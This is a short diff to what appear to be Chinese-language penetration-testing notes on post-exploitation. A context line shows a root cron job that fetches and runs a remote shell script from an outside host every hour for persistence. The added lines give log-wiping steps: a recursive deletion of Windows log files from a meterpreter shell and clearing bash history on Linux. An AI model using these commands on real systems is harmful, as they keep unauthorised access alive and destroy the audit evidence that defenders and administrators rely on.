@@ -33,6 +33,24 @@ echo "0 */1 * * * root bash <(curl -s -L http://10.211.55.6/laohe.sh) >> /dev/nu
 每一小时建立一次连接
 
 
+###系统日志清理，仅本地清理
+如果保存至服务器，日志则不能被清理
+
+#Windows日志清理
+win+R eventvwr
+打开事件查看器-Windows日志-安全
+或者
+meterpreter > shell
+C:\Windows\system32>del %WINDIR%\*.log /a/s/q/f
+
+#linux系统清理
+history -c
+清除历史命令
+
+
+
+
+
 
 
 
